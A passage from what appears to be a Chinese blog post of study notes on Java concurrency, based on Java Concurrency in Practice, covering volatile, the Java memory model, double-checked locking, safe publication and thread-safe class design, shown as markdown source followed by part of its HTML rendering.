去掉volatile，则无限循环\n      static volatile boolean sleep = false;\n  \n      public static void main(String[] args) throws InterruptedException {\n          new Thread(() -> {\n              while (!sleep) {\n              }\n              System.out.println(\"out of sleep\");\n          }).start();\n          Thread.sleep(100);\n          sleep = true;\n      }\n  }\n  ```\n\n- anything that was visible to thread A when it writes to volatile field `f` becomes visible to thread B when it reads `f`.\n\n- synchronized在内存可见性上的作用比volatile变量更强\n\n- 依赖volatile变量来控制状态的可见性，通常比使用锁的代码更加脆弱，更加难以理解\n\n- 无法确保原子性（锁可以确保原子性和可见性）\n\n- 正确的使用方式\n  - 确保他们状态的可见性\n  - 确保它们所引用的状态的可见性\n     > This declares a volatile reference to an array, which might not be what you want. With a volatile reference to an array, reads and writes of the reference to the array are treated as volatile, but **the array elements are non-volatile**. To get volatile array elements, you will need to use one of the atomic array classes in java.util.concurrent (provided in Java 5.0). (ref from `FindBugs`)\n  - 标志一些重要的程序生命周期事件的发生\n\n- 满足以下所有条件时，才应该使用\n  - 对变量的写入不依赖于当前值，或者只有单个线程**写**该变量\n  - 该变量不会与其他状态变量一起纳入不变性条件中\n  - 在访问变量时不需要加锁\n\n- 关于重排序([来自于](https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html))\n\n  - 旧内存模型\n\n    - Under the old memory model, accesses to volatile variables could not be reordered with each other, but they could be reordered with nonvolatile variable accesses.\n\n  - 新内存模型（新内存模型是JSR133）\n\n    - Under the new memory model, it is still true that volatile variables cannot be reordered with each other. The difference is that it is now no longer so easy to reorder normal field accesses around them.\n\n    -  Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, **anything that was visible to thread A when it writes to volatile field `f` becomes visible to thread B when it reads `f`.**\n\n      ```java\n      class VolatileExample {\n        int x = 0;\n        volatile boolean v = false;\n        public void writer() {\n          x = 42;\n          v = true;\n        }\n      \n        public void reader() {\n          if (v == true) {\n            // uses x - guaranteed to see 42.\n            // This would not have been true under the old memory model. \n          }\n        }\n      }\n      ```\n\n    - Effectively, the semantics of volatile have been strengthened substantially, almost to the level of synchronization. Each read or write of a volatile field acts like \"half\" a synchronization, for purposes of visibility.\n\n    - Note that it is important for both threads to access the same volatile variable in order to properly set up the happens-before relationship. It is not the case that everything visible to thread A when it writes volatile field `f` becomes visible to thread B after it reads volatile field `g`. **The release and acquire have to \"match\"**(i.e., be performed on the same volatile field) to have the right semantics\n\n### 文档\n\n－应该详细记载的内容\n   - 同步策略（什么状态由什么锁保护、可见性如何维护）\n   - 加锁顺序\n   - 没有加锁情况下的同步策略（比如使用一个flag阻止其他线程在flag为true之前使用某资源）\n   - 资源池的配置（避免资源依赖死锁）\n   - 如果不能通过open call来避免死锁，那么应该详细记载如何避免在调用时出现死锁\n- 应该将条件队列相关联的条件谓词以及在这些谓词上等待的操作都写入文档\n\n### 对象的初始化\n\n- 即使某个对象的引用对于其他线程是可见的，也并不意味着对象状态对于使用该对象的线程一定是可见的\n- 为了确保对象状态能够呈现出一致的视图，必须使用同步\n\n### `this`逸出\n\n- 只有当对象的构造函数返回时，对象才处于可预测的和一致的状态。因此，从构造函数发布对象时，发布了一个尚未构造完成的对象。\n- 例子：\n  - 在构造函数启动线程\n  - 在构造函数调用一个可以override的方法（非private、非final的方法，可以被子类override）\n- 可以通过使用`start`函数来启动线程、使用工厂方法和私有构造函数（即不要再构造函数启动，而是在工厂方法中，构造函数返回后才启动）\n\n### Final域\n\n- 还有一种情况可以安全地访问一个共享域， 即这个域声明为 final 时\n\n- 在java内存模型中，final域能确保初始化过程的安全性，从而可以不受限制的访问不可变对象，并在共享这些对象时无需同步。为了维持这种初始化安全性的保证，需要满足不可变性的所有需求\n\n  - 状态不可修改\n  - 所有域都是final类型\n  - 正确的构造\n\n  这种保证还延伸到正确创建的对象中所有final类型的域，在没有额外同步的情况下，也可以安全的访问final类型的域。不过，如果这些final域指向的是可变对象，那么访问这些域所指向的对象的状态时还是需要同步\n\n- 在发布不可变对象时，没有使用同步，也可以安全地访问该对象\n\n### 原子变量\n\n- 如果有大量线程要访问相同的原子值， 性能会大幅下降， 因为乐观更新需要太多次重试。\n-  Java SE 8 提供了 LongAdder 和 LongAccumulator 类来解决这个问题。LongAdder 包括多个变量（加数)， 其总和为当前值。可以有多个线程更新不同的加数，线程个数增加时会自动提供新的加数。通常情况下， 只有当所有工作都完成之后才需要总和的值， 对于这种情况，这种方法会很高效。性能会有显著的提升。\n\n### Double Checked Locking(DCL)\n\n- [来自于](https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html)\n\n- 示例代码\n\n  ```java\n  // double-checked-locking - don't do this!\n  \n  private static Something instance = null;\n  \n  public Something getInstance() {\n    if (instance == null) {\n      synchronized (this) {\n        if (instance == null)\n          instance = new Something();\n      }\n    }\n    return instance;\n  }\n  ```\n\n- There's only one problem with it -- **it doesn't work**. Why not? The most obvious reason is that the writes which initialize `instance` and the write to the `instance` field can be reordered by the compiler or the cache, which would have the effect of **returning what appears to be a partially constructed `Something`**. The result would be that we read an uninitialized object. \n\n- There is no way to fix it using the **old Java memory model.**\n\n- Under the new memory model, making the `instance` field volatile will \"fix\" the problems with double-checked locking, because then there will be a happens-before relationship between the initialization of the `Something` by the constructing thread and the return of its value by the thread that reads it.（我猜，这个happen-before是不是就是`程序顺序规则`（each action in a thread haappens-before every action in that thread that come later in the program order）和`传递性`和`volatile 变量规则`的结合——就是`instance=new Something()`在单线程中必须保证构造操作在赋值给instance操作之前，然后volatile又保证了写入在读取之前，所以一旦另一个线程读取了instance，则根据传递性，构造操作已经完成了）\n\n- ```java\n  public class Something {\n      private Something() {}\n  \n      private static class LazyHolder {\n          static final Something INSTANCE = new Something();\n      }\n  \n      public static Something getInstance() {\n          return LazyHolder.INSTANCE;\n      }\n  }\n  ```\n\n  This code is guaranteed to be correct because of **the initialization guarantees for static fields; if a field is set in a static initializer, it is guaranteed to be made visible, correctly, to any thread that accesses that class**.\n\n### 锁\n\n- 作用\n  - 互斥\n  - 原子性（复合操作的执行过程中持有一个锁，则这组操作成为原子操作）\n  - 内存可见性（所有线程都能看到共享变量的最新值——只需要所有线程都在同一个锁上同步）\n\n### synchronized\n\n- 用于实现原子性\n- 可重入\n- 确定临界区\n- Constructors in Java can not use the synchronized keyword，但是可以`synchronized(this){}`\n- 内存可见性——某个线程修改了对象状态后，其他线程可以看到发生的状态的变化\n- 每个对象都有一个内部锁，该锁有一个内部条件（条件对应Object对象的final方法`wait`、`notify`、`notifyAll`方法）（所以一旦某个对象的一个`synchronized`方法被调用后，该对象的另一个`synchronized`方法会被阻塞）\n- 调用synchronized静态方法获得相关的类对象（Class对象）的内部锁。要注意，使用不同的classLoader加载出来的Class对象是不同的\n- 监视器\n  - 用Java的术语来讲，监视器具有如下特性：\n    - 监视器是只包含私有域的类。\n    - 每个监视器类的对象有一个相关的锁。\n    - 使用该锁对所有的方法进行加锁。换句话说，如果客户端调用obj.meth0d(),那么obj对象的锁是在方法调用开始时自动获得（这是获得锁的唯一途径），并且当方法返回时自动释放该锁（无论是正常退出还是异常退出）。因为所有的域是私有的，这样的安排可以确保一个线程在对对象操作时，没有其他线程能访问该域\n    - 该锁可以有任意多个相关条件\n  - Java设计者以不是很精确的方式采用了监视器概念，Java中的每一个对象有一个内部的锁和内部的条件。如果一个方法用synchronized关键字声明，那么，它表现的就像是一个监视器方法。通过调用wait/notifyAll/notify来访问条件变量。然而，在下述的3个方面Java对象不同于监视器，从而使得线程的安全性下降：\n    - 域不要求必须是private。\n    - 方法不要求必须是synchronized。\n    - 内部锁对客户是可用的。\n- 局限\n  - 不能中断一个正在试图获得锁的线程\n  - 没有超时\n  - 只有单一的条件\n  - 不提供公平的锁\n\n### 内存可见性\n\n- 最低安全性\n  - 某个线程没有同步情况下读取变量，可能会得到一个失效值，但这个值至少是之前某个线程设置的，而不是随机的\n  - Java内存模型要求，变量的读取和写入必须是原子操作，但是非`volatile`的`long`，`double`例外\n  - JVM允许将64bit的读或写操作分解为两个32bit的操作，因此可能无法满足最低安全性（除非用`volatile`声明或是用锁保护）\n\n### 不可变对象\n\n#### 需要满足的条件\n\n- 对象创建后其状态不能修改\n- 对象的所有域是final类型的（可以不用，比如`String`的`hashCode`这个field）\n- 对象是正确创建的（创建期间，this没有逸出）\n\n#### misc\n\n- 对象内部可以使用可变对象来管理状态\n\n- 例子\n\n  ```java\n  public final class ThreeStooges {\n      private final Set<String> stooges = new HashSet<String>();\n  \n      public ThreeStooges() {\n          stooges.add(\"Moe\");\n          stooges.add(\"Larry\");\n          stooges.add(\"Curly\");\n      }\n  \n      public boolean isStooge(String name) {\n          return stooges.contains(name);\n      }\n  }\n  ```\n\n- 使用`volatile`+不可变对象来实现一组状态的原子操作\n\n  ```java\n  class OneValueCache {\n      private final BigInteger lastNumber;\n      private final BigInteger[] lastFactors;\n  \n      public OneValueCache(BigInteger i,\n                           BigInteger[] factors) {\n          lastNumber = i;\n          // 如果没有这个copyOf，就不是不可变的\n          lastFactors = Arrays.copyOf(factors, factors.length);\n      }\n  \n      public BigInteger[] getFactors(BigInteger i) {\n          if (lastNumber == null || !lastNumber.equals(i))\n              return null;\n          else\n              return Arrays.copyOf(lastFactors, lastFactors.length);\n      }\n  }\n  \n  public class VolatileCachedFactorizer implements Servlet {\n      private volatile OneValueCache cache =\n              new OneValueCache(null, null);\n  \n      public void service(ServletRequest req, ServletResponse resp) {\n          BigInteger i = extractFromRequest(req);\n          // 如果这里多个请求到来，某个请求调用getFactors调用到一半\n          // 然后另一个请求则把cache赋值成另外一个对象，那么有没有问题？\n          // 似乎c++就不可以这样做，因为这个需要自动垃圾收集\n          BigInteger[] factors = cache.getFactors(i);\n          if (factors == null) {\n              factors = factor(i);\n              cache = new OneValueCache(i, factors);\n          }\n          encodeIntoResponse(resp, factors);\n      }\n  }\n  ```\n\n### 正确的发布\n\n- 发布（publish）：使对象能够在当前作用域之外的代码中使用\n\n- 逸出（escape）：某个不该发布的对象被发布\n\n- 不可变对象**可以通过任意的机制发布**\n   - 3.4节，不可变对象那里，代码3-13使用了`volatile`来保证其他线程看到最新的引用。另外，3.5.2节说，即使发布不可变对象时，没有使用同步，仍然可以安全的访问该对象（上面那一段说，“即使某个对象的引用对于其他线程可见，也不意味着对象的状态对于使用该对象的线程一定是可见的”）。这里的“不需要同步”的含义是指，不需要同步即可以保证对象状态的可见性，而不是说，每次更新引用，都会让其他线程看到新的引用值。\n     ```java\n     class SynTest {\n         static FC fc = null;\n     \n         public static void main(String[] args) throws InterruptedException {\n             Thread t1 = new Thread(() -> {\n                 fc = new FC();\n             });\n             Thread t2 = new Thread(() -> {\n                 while (fc == null) {\n                 }\n                 int n = fc.n * 10;\n                 assert n * 10 == 50 * 20;\n             });\n             t2.start();\n             Thread.sleep(100);\n             t1.start();\n         }\n     \n         static class FC {\n             final int n = 10;\n         }\n     }\n     ```\n   - 第二个线程没有退出。所以，其实不可变对象的发布时不需要同步的含义应该是“另一个线程可以看到完整的对象状态”。（很奇怪，如果把两个`start`的位置颠倒，或者是去掉`sleep`，则会导致成功结束)\n   - Java内存模型为不可变对象的共享提供了一种特殊的初始化安全性保证\n   - 即使在发布不可变对象的引用时没有使用同步，也可以安全的访问该对象。为了实现这种安全，对象必须满足上面提到的不可变对象的所有要求\n   - 这种保证还包括被**正确创建对象**中的所有final类型的域。但是如果这些域是可变对象，那么在访问时还是需要同步\n- 事实不可变对象（比如某个`Date`对象被构造后，就只执行读操作，类似于java要求lambda可以读取的lambda外变量是“事实不可变的”）**必须通过安全的方式发布**\n- 可变对象**必须通过安全的方式发布**，并且必须是线程安全的或者某个锁保护起来\n\n#### 可变对象的正确的发布\n\n- 即使某个对象的引用对于其他线程是可见的，也不意味着对象状态对于使用该对象的线程是一定可见的。为了确保对象状态呈现出一致性视图（对象的引用与对象的状态必须同时对其他线程可见），必须要使用**同步**（包括发布时和使用时）\n\n- 常用的发布模式\n\n  - 在静态初始化函数中初始化一个对象引用（不知道“静态初始化函数”是否等价于“静态初始化器”）（因为静态初始化器由JVM在类的初始化阶段执行，JVM内部存在同步机制）\n\n    ```java\n    public static Holder holder = new Holder(42);\n    ```\n\n    > 虚拟机会保证一个类的`<clinit>()`方法在多线程环境中被正确地加锁、同步,如果多个线程同时去初始化一个类,那么只会有一个线程去执行这个类的`<clinit>()`方法,其他线程都需要阻塞等待,直到活动线程执行`<clinit>()`方法完毕\n    >\n    >  \n    >\n    > `<clinit>()`方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块(`static{}`块)中的语句合并产生的\n    >\n    > 来自深入理解JVM\n\n  - 将对象的引用保存在volatile类型的域或者AtomicReference对象中\n\n  - 将对象的引用保存在某个正确构造对象的final类型域中\n\n  - 将对象的引用保存在一个由锁保护的域中\n\n    - 线程安全容器（比如`Hashtable`、`synchronizedMap`、`ConcurrentMap`、`Vector`、`CopyOnWriteArrayList`、`CopyOnWriteArraySet`、`synchronizedList`、`synchronizedSet`、`BlockingQueue`、`ConcurrentLinkedQueue`）内部的同步意味着将对象放入到某个容器中，将满足这一条要求）\n    - `Future`、`Exchanger`也可以\n\n### lambda使用外部的对象（或value type的变量）\n\n> 以下均为我个人根据final域的特性认为的——不知道final域与final变量的差别是什么\n\n- lambda可以使用外部的final或事实final的变量\n- 如果是这个final对象引用的变量，没有问题，可见（就是引用对于其他线程可见时，其内部的状态也是，可以保证一致性）\n- 如果引用的是可变对象，则要同步\n\n### 内部类与final变量\n\n- TODO：内部类引用外部的变量时，不要求其为final的，那么怎么办，可见性如何保证\n\n### volatile vs 锁\n\n- 锁可以确保可见性和原子性\n- volatile只确保可见性\n\n### MISC\n\n- 开发服务器应用时，要始终加上`-server`参数，client模式的JVM优化与server的不一样\n\n\n### 内存屏障\n   - MFENCE, LFENCE, SFENCE (Ref from intel manual 325462-sdm-vol-1-2abcd-3abcd)\n      > - MFENCE: Performs a serializing operation on all load-from-memory and store-to-memory instructions that were issued prior the MFENCE instruction. **This serializing operation guarantees that every load and store instruction that precedes the MFENCE instruction in program order becomes globally visible before any load or store instruction that follows the MFENCE instruction.** The MFENCE instruction is ordered with respect to all load and store instructions, other MFENCE instructions, any LFENCE and SFENCE instructions, and any serializing instructions (such as the CPUID instruction). MFENCE does not serialize the instruction stream.\n      > - SFENCE: Orders processor execution relative to all memory stores prior to the SFENCE instruction. **The processor ensures that every store prior to SFENCE is globally visible before any store after SFENCE becomes globally visible.** The SFENCE instruction is ordered with respect to memory stores, other SFENCE instructions, MFENCE instructions, and any serializing instructions (such as the CPUID instruction). It is not ordered with respect to memory loads or the LFENCE instruction.\n      > - LFENCE: **Performs a serializing operation on all load-from-memory instructions that were issued prior the LFENCE instruction. Specifically, LFENCE does not execute until all prior instructions have completed locally, and no later instruction begins execution until LFENCE completes**. In particular, an instruction that loads from memory and that precedes an LFENCE receives data from memory prior to completion of the LFENCE. (An LFENCE that follows an instruction that stores to memory might complete before the data being stored have become globally visible.) Instructions following an LFENCE may be fetched from memory before the LFENCE, but they will not execute until the LFENCE completes.\n   - read barrier, write barrier, ([Ref](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/Documentation/memory-barriers.txt?id=HEAD))\n      > - Read barrier: **A read barrier is a data dependency barrier plus a guarantee that all the LOAD operations specified before the barrier will appear to happen before all the LOAD operations specified after the barrier with respect to the other components of the system.** A read barrier is a partial ordering on loads only; **it is not required to have any effect on stores**. Read memory barriers imply data dependency barriers, and so can substitute for them. [!] Note that read barriers should normally be paired with write barriers; see the \"SMP barrier pairing\" subsection.\n      > - Data dependency barrier:  **A data dependency barrier is a weaker form of read barrier. In the case where two loads are performed such that the second depends on the result of the first** (eg: the first load retrieves the address to which the second load will be directed), a data dependency barrier would be required to make sure that the target of the second load is updated after the address obtained by the first load is accessed. \n      > - General memory barriers. **A general memory barrier gives a guarantee that all the LOAD and STORE operations specified before the barrier will appear to happen before all the LOAD and STORE operations specified after the barrier with respect to the other components of the system**. \n      > - Write memory barrier: **A write memory barrier gives a guarantee that all the STORE operations specified before the barrier will appear to happen before all the STORE operations specified after the barrier with respect to the other components of the system**. \n\n### 设计线程安全类\n\n- 三个要素\n  - 找出构成对象状态的所有变量\n    - 如果在对象域中引用了其他对象，那么该对象的状态就包含被引用对象的域\n    - 在定义哪些变量将构成对象的状态时，只考虑对象拥有的数据\n  - 找出约束状态变量的不变性条件\n  - 建立对象状态的并发访问管理策略\n    - 同步策略定义了如何在不违背对象不变条件或后验条件（在操作中会包含一些后验条件来判断状态的迁移是否有效——比如要求某变量如果当前是17，那么下一次更新是18）的情况下对其状态的访问操作进行协同\n    - 同步策略规定了如何将不可变性、线程封闭、加锁机制等结合起来维护线程的安全性。还规定了哪些变量由哪些锁来保护\n    - 必须要将同步策略写为正式文档\n- 尽可能使用final域以缩小状态空间\n- 如果变量的某些状态是无效的，那么就要对该变量进行封装以避免用户的修改使得该变量处于无效状态。如果某个操作中存在无效的状态转换那么该操作就必须是原子的\n- 如果一个类是由多个独立且线程安全的状态变量组成，并且所有的操作都不包含无效的状态转换，那么可以将线程安全性委托给底层的状态变量\n- 如果一个状态变量是线程安全的，并且没有任何不变性条件来约束它的值，在变量的操作上也不存在任何不允许的状态转换（然而按照线程安全的定义，似乎如果满足以上要求，那么线程安全也就必然满足），那么就可以安全地发布这个变量\n- 当把线程安全委托给底层的线程安全对象时，如果这些变量不是`final`，那么会导致一个问题——引用可能会引用了另一个对象。\n\n\n### 基于现有的线程安全类添加特性\n\n- 最好的方法是直接修改原始类，这需要理解代码中的同步策略。好处在于所有实现同步策略的代码在同一个源文件中\n- 另一种方法是extend这个类，但是可能有的类的一些状态是private，子类访问不到，所以行不通。不好的地方在于同步策略的实现被分布到多个单独维护的源文件中，如果底层的类改变了同步策略那么子类就不安全了。\n- 客户端加锁：对于使用对象X的用户代码，在用户代码中，使用X本身用于保护其状态的锁来保护这段用户代码。这里的问题在于，如果文档没有明确指出X使用的锁，那么这个锁在以后版本中可能会修改，从而导致用户代码相对于X的代码不是原子的（在用户代码执行过程中，X内的代码可能执行）。这种会破坏同步策略的封装性（类似于extend会破坏实现的封装性）。与前一种一样，都是将派生类的行为与基类的行为耦合在一起\n- 组合：类似于`Collections.synchronizedXXX`，用户传递一个对象给该方法（转移所有权，以后都通过这个工厂方法返回的对象来操作），新对象内使用委托和加锁来实现。这种不依赖于被委托对象的线程安全性和使用的锁策略\n\n### 依赖状态的操作\n\n- 类的不变性条件和后验条件约束了在对象上有哪些状态和状态转换是有效的。在某些对象的方法中还包含一些基于状态的先验条件（比如，从队列中pop时，队列必须非空）。如果某个操作中包含有基于状态的先验条件，则这个操作就叫做依赖状态的操作\n\n### 使用私有的锁 vs 使用对象的内置锁\n\n- 优点\n  - 私有锁可以将锁封闭起来，避免用户代码得到锁，以避免用户代码参与到同步策略中\n  - 如果使用内置锁，要想验证锁是否被正确使用，需要检查整个程序\n\n### 实例分析\n\n#### 一个线程安全的车辆追踪器的代码解析\n\n- 不可变的Point类，因为不可变，所以复制map时只需要复制map的结构，无需复制Point的内容。返回的unmodifableMap也类似如此。（代码来源，JCIP代码清单4.7和4.6）\n   ```java\n   class DelegatingVehicleTracker {\n       private final ConcurrentMap<String, Point> locations;\n       private final Map<String, Point> unmodifiableMap;\n   \n       // 构造函数的安全依赖于用户——如果用户在构造函数运行时，\n       // 修改参数points的内容，那么locations的视图就可能是不一致的。\n       // 并且，用户需要自己保证这个DelegatingVehicleTracker类是安全的发布的，\n       // 从而，保证在构造函数运行完之前，类内的其他非静态函数不会被调用\n       public DelegatingVehicleTracker(Map<String, Point> points) {\n           locations = new ConcurrentHashMap<>(points);\n           unmodifiableMap = Collections.unmodifiableMap(locations);\n       }\n   \n       // 返回的unmodifiableMap内部是没有同步的，\n       // 那么，locations的修改是如何反映到unmodifiableMap的？\n       // 通过ConcurrentMap来保证\n       public Map<String, Point> getLocations() {\n           return unmodifiableMap;\n       }\n   \n       public Point getLocation(String id) {\n           return locations.get(id);\n       }\n   \n       public void setLocation(String id, int x, int y) {\n           if (locations.replace(id, new Point(x, y)) == null)\n               throw new IllegalArgumentException(\n                       \"invalid vehicle name: \" + id);\n       }\n   \n       class Point {\n           final int x, y;\n   \n           public Point(int x, int y) {\n               this.x = x;\n               this.y = y;\n           }\n       }\n   }\n   ```\n- 可变的线程安全的Point，如果在point的状态上施加不变性任何约束，那么以下就不是线程安全的，因为用户可以修改返回的point对象。（代码来源，JCIP代码清单4.11，4.12）\n   ```java\n   class PublishingVehicleTracker {\n       private final Map<String, SafePoint> locations;\n       private final Map<String, SafePoint> unmodifiableMap;\n   \n       public PublishingVehicleTracker(\n               Map<String, SafePoint> locations) {\n           this.locations\n                   = new ConcurrentHashMap<>(locations);\n           this.unmodifiableMap\n                   = Collections.unmodifiableMap(this.locations);\n       }\n   \n       public Map<String, SafePoint> getLocations() {\n           return unmodifiableMap;\n       }\n   \n       public SafePoint getLocation(String id) {\n           return locations.get(id);\n       }\n   \n       public void setLocation(String id, int x, int y) {\n           if (!locations.containsKey(id))\n               throw new IllegalArgumentException(\n                       \"invalid vehicle name: \" + id);\n           locations.get(id).set(x, y);\n       }\n   \n       public class SafePoint {\n           private int x, y;\n   \n           private SafePoint(int[] a) {\n               this(a[0], a[1]);\n           }\n   \n           // 此处，如果实现为`this(p.x, p.y)`就会有竞态条件，\n           public SafePoint(SafePoint p) {\n               this(p.get());\n           }\n   \n           public SafePoint(int x, int y) {\n               this.x = x;\n               this.y = y;\n           }\n   \n           public synchronized int[] get() {\n               return new int[]{x, y};\n           }\n   \n           public synchronized void set(int x, int y) {\n               this.x = x;\n               this.y = y;\n           }\n       }\n   }\n   ```\n\n\n### ConcurrentHashMap\n\n> 来自JCIP的5.2.1，不清楚JDK5之后有没有修改\n\n- 使用一种粒度更细的加锁机制——分段锁\n- 一定数量的写入线程可以并发的修改Map\n- 迭代器具有弱一致性，而不是fail-fast（HashMap等的是fail-fast，从而如果迭代时发现数量变化了，就会抛出`ConcurrentModificationException`），不会抛出`ConcurrentModificationException`。可以容忍并发的修改\n- `size`返回的只是估计值\n- 内部没有实现对map加锁以独占访问（对比之下，同步容器`Hashtable`，`synchronizedMap`中可以通过获取map的锁来实现独占），所以不能在用户代码通过获取map的锁来独占（所以如果确实需要独占，应该放弃ConcurrentHashMap）\n\n\n### condition\n\n#### `Condition.signal`要在持有锁时才能调用\n\n- lost-wake-up问题，比如说代码如下\n   ```java\n   cnt+=1;\n   notify();\n   ```\n   ```java\n   while(cnt<=0) {\n       wait();\n   }\n   ```\n- 然后，在检查了`cnt<=0`这个条件后、调用`wait`之前，有个线程完成了`cnt++;notify()`的操作，那么消费者就丢失了wake-up，陷入了无限等待（如果其在等待时没有被唤醒的话）\n","content":"<blockquote>\n<p>以下大部分是<em>java Concurrency in Practice</em>的笔记，以<code>JCIP</code>简称之</p>\n</blockquote>\n<h3 id=\"对象的状态\"><a href=\"#对象的状态\" class=\"headerlink\" title=\"对象的状态\"></a>对象的状态</h3><ul>\n<li>（非正式意义上），对象的状态是指存储在状态变量中的数据，可能包括其他依赖对象的域（例如HashMap的Map.Entry对象）</li>\n<li>对象的状态中包含了任何可能影响其外部可见行为的数据</li>\n</ul>\n<h3 id=\"线程安全性的定义\"><a href=\"#线程安全性的定义\" class=\"headerlink\" title=\"线程安全性的定义\"></a>线程安全性的定义</h3><ul>\n<li><p>正确性的含义</p>\n<ul>\n<li><p>某个类的行为与其规范完全一致。在良好的规范中通常会定义各种不变性条件（Invariant）来约束对象的状态，以及定义各种后验条件来描述对象操作的结果</p>\n</li>\n<li><blockquote>\n<p>a <strong>postcondition</strong> is a condition or predicate that must always be true just after the execution of some section of code or after an operation in a formal specification.</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li><p>当多个线程访问某个类时，这个类始终能够表现出正确的行为，那么就称这个类是线程安全的</p>\n</li>\n<li><p>当多个线程访问一个对象时， 如果不用考虑这些线程在运行时环境下的调度和交替执行， 也不需要进行额外的同步， 或者在调用方进行任何其他的协调操作， 调用这个对象的行为都可以获得正确的结果， 那这个对象是线程安全的</p>\n</li>\n</ul>\n<h3 id=\"JCIP中“同步”的含义\"><a href=\"#JCIP中“同步”的含义\" class=\"headerlink\" title=\"JCIP中“同步”的含义\"></a>JCIP中“同步”的含义</h3><ul>\n<li>synchronized关键字</li>\n<li>volatile变量</li>\n<li>显式锁</li>\n<li>原子变量</li>\n</ul>\n<h3 id=\"竞态条件\"><a href=\"#竞态条件\" class=\"headerlink\" title=\"竞态条件\"></a>竞态条件</h3><ul>\n<li>在并发编程中，由于不恰当的执行时序而出现不正确的结果（这不是正式的定义）</li>\n<li>竞态条件类型举例<ul>\n<li>先检查后执行（比如<code>if(i==1) {i=10;}</code>）。大多数竞态条件的本质：基于一种可能失效的观察结果来做出判断或执行计算</li>\n</ul>\n</li>\n<li>并非所有的竞态条件都是数据竞争，同样并非所有的数据竞争都是竞态条件</li>\n</ul>\n<h3 id=\"数据竞争\"><a href=\"#数据竞争\" class=\"headerlink\" title=\"数据竞争\"></a>数据竞争</h3><ul>\n<li><p>访问共享的非final类型的域时没有采用同步来协同，则会出现数据竞争</p>\n<blockquote>\n<p>A data race occurs when:</p>\n<ul>\n<li>two or more threads in a <strong>single process</strong> access the same memory location concurrently, and</li>\n<li>at least one of the accesses is for writing, and</li>\n<li>the threads are not using any exclusive locks to control their accesses to that memory.</li>\n</ul>\n<p>When these three conditions hold, the order of accesses is non-deterministic, and the computation may give different results from run to run depending on that order. Some data-races may be benign (for example, when the memory access is used for a busy-wait), but many data-races are bugs in the program.</p>\n<p><a href=\"https://docs.oracle.com/cd/E19205-01/820-0619/geojs/index.html\" target=\"_blank\" rel=\"noopener\">ref from</a></p>\n</blockquote>\n</li>\n<li><p>在java的内存模型中，如果在代码中存在数据竞争，那么这段代码就没有确定的语义</p>\n</li>\n</ul>\n<h3 id=\"原子性\"><a href=\"#原子性\" class=\"headerlink\" title=\"原子性\"></a>原子性</h3><ul>\n<li>假定有两个操作A、B，从执行A的线程来看，当另一个线程执行B时，要么将B完全执行完，要么完全不执行B，那么A和B对彼此来说是原子的</li>\n<li>原子操作是指，对于访问同一个状态的所有操作（包括这个操作本身）来说，这个操作是以一种原子方式执行</li>\n<li>与事务应用程序中的和原子性有相同的含义：一组语句作为一个不可分割的单元被执行</li>\n</ul>\n<h3 id=\"volatile变量\"><a href=\"#volatile变量\" class=\"headerlink\" title=\"volatile变量\"></a>volatile变量</h3><ul>\n<li><p>只有成员变量才能使用它</p>\n</li>\n<li><p>用来确保变量的更新操作通知到其他线程</p>\n<p>以下代码可以复现，无论是否有<code>server</code>模式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">VolatileTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 去掉volatile，则无限循环</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">boolean</span> sleep = <span class=\"keyword\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(() -&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (!sleep) &#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"out of sleep\"</span>);</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        sleep = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>anything that was visible to thread A when it writes to volatile field <code>f</code> becomes visible to thread B when it reads <code>f</code>.</p>\n</li>\n<li><p>synchronized在内存可见性上的作用比volatile变量更强</p>\n</li>\n<li><p>依赖volatile变量来控制状态的可见性，通常比使用锁的代码更加脆弱，更加难以理解</p>\n</li>\n<li><p>无法确保原子性（锁可以确保原子性和可见性）</p>\n</li>\n<li><p>正确的使用方式</p>\n<ul>\n<li>确保他们状态的可见性</li>\n<li>确保它们所引用的状态的可见性<blockquote>\n<p>This declares a volatile reference to an array, which might not be what you want. With a volatile reference to an array, reads and writes of the reference to the array are treated as volatile, but <strong>the array elements are non-volatile</strong>. To get volatile array elements, you will need to use one of the atomic array classes in java.util.concurrent (provided in Java 5.0). (ref from <code>FindBugs</code>)</p>\n</blockquote>\n</li>\n<li>标志一些重要的程序生命周期事件的发生</li>\n</ul>\n</li>\n<li><p>满足以下所有条件时，才应该使用</p>\n<ul>\n<li>对变量的写入不依赖于当前值，或者只有单个线程<strong>写</strong>该变量</li>\n<li>该变量不会与其他状态变量一起纳入不变性条件中</li>\n<li>在访问变量时不需要加锁</li>\n</ul>\n</li>\n<li><p>关于重排序(<a href=\"https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html\" 